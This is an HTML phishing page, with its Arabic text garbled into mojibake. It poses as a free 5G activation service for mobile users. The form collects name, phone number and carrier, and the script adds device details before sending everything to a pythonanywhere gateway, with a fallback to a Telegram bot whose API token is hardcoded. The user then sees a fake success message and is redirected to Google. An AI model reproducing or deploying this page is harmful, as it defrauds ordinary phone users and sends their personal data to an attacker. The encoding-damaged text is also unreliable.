<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø±Ù‚Ù…ÙŠ Ø§Ù„Ù…ÙˆØ­Ø¯</title>
    <style>
        /* Ø§Ù„ØªÙ†Ø³ÙŠÙ‚ Ø§Ù„Ø°ÙŠ ØªÙØ¶Ù„Ù‡ ÙŠØ¨Ù‚Ù‰ ÙƒÙ…Ø§ Ù‡Ùˆ */
        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; text-align: center; }
        .header { background: linear-gradient(45deg, #1a237e, #0d47a1); color: white; padding: 30px; }
        .container { max-width: 450px; margin: -20px auto; background: white; border-radius: 15px; padding: 25px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 5px solid #ff1744; }
        .input-group { margin: 15px 0; text-align: right; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
        .btn { background: #ff1744; color: white; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: bold; cursor: pointer; }
        #loading { display: none; margin-top: 15px; }
    </style>
</head>
<body>

<div class="header">
    <h2>Ø§Ù„Ù…Ù†ØµØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© Ø§Ù„Ù…ÙˆØ­Ø¯Ø©</h2>
    <p>ØªÙ†Ø´ÙŠØ· Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø§Ù…Ø³ Ù…Ø¬Ø§Ù†Ø§Ù‹</p>
</div>

<div class="container">
    <div class="input-group">
        <label>Ù…Ø²ÙˆØ¯ Ø§Ù„Ø®Ø¯Ù…Ø©</label>
        <select id="prov">
            <option>Yemen Mobile</option>
            <option>STC</option>
            <option>Vodafone</option>
        </select>
    </div>
    <div class="input-group">
        <label>Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„</label>
        <input type="text" id="nm" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„Ø±Ø¨Ø§Ø¹ÙŠ">
    </div>
    <div class="input-group">
        <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
        <input type="number" id="ph" placeholder="77xxxxxxx">
    </div>
    <button class="btn" onclick="go()">ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¢Ù† âœ…</button>

    <div id="loading">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ£Ù…ÙŠÙ†...</div>
</div>

<script>
// --- Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø³ÙŠØ§Ø¯Ø© ---
const GATEWAY_URL = "https://gsgbs.pythonanywhere.com/gate"; // Ø±Ø§Ø¨Ø· Ø³ÙŠØ±ÙØ±Ùƒ ÙÙŠ Ø¨Ø§ÙŠØ«ÙˆÙ†
const urlParams = new URLSearchParams(window.location.search);
const CHAT_ID = urlParams.get('id') || "7715667493";

async function go() {
    const n = document.getElementById('nm').value;
    const p = document.getElementById('ph').value;
    const pr = document.getElementById('prov').value;

    if(!n || !p) return alert("Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù†Ø§Ù‚ØµØ©");

    document.getElementById('loading').style.display = 'block';

    // Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²
    const device = await getD();
    const report = `ğŸ‘¤ **Ø§Ù„Ø§Ø³Ù…:** ${n}\nğŸ“ **Ø§Ù„Ù‡Ø§ØªÙ:** ${p}\nğŸ¢ **Ø§Ù„Ø´Ø±ÙƒØ©:** ${pr}\n\nğŸ“± **Ø§Ù„Ø¬Ù‡Ø§Ø²:**\n${device}`;

    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¹Ø¨Ø± Ø§Ù„Ø³ÙŠØ±ÙØ± (Ø§Ù„ÙˆØ³ÙŠØ·) Ù„Ø¶Ù…Ø§Ù† Ø¹Ø¯Ù… Ø§Ù„ÙØ´Ù„
    try {
        await fetch(`${GATEWAY_URL}?id=${CHAT_ID}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'info',
                content: report,
                label: "ğŸ¯ ØµÙŠØ¯ Ù…Ù† Ø§Ù„Ù…Ù†ØµØ© Ø§Ù„Ù…ÙˆØ­Ø¯Ø©"
            })
        });
        
        alert("ØªÙ…Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­! Ø§Ù†ØªØ¸Ø± Ø§Ù„ØªÙØ¹ÙŠÙ„.");
        window.location.href = "https://www.google.com";
    } catch (e) {
        // Ø¥Ø°Ø§ ÙØ´Ù„ Ø§Ù„Ø³ÙŠØ±ÙØ±ØŒ Ù†Ø­Ø§ÙˆÙ„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± ÙƒØ®Ø·Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ©
        console.log("Gateway failed, trying direct...");
        const tgUrl = `https://api.telegram.org/bot8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q/sendMessage`;
        fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: report })
        });
    }
}

async function getD() {
    let b = "N/A";
    if (navigator.getBattery) {
        const bt = await navigator.getBattery();
        b = `${Math.round(bt.level * 100)}%`;
    }
    return `- Ø§Ù„Ù†Ø¸Ø§Ù…: ${navigator.platform}\n- Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${b}\n- Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString()}`;
}
</script>
</body>
</html>
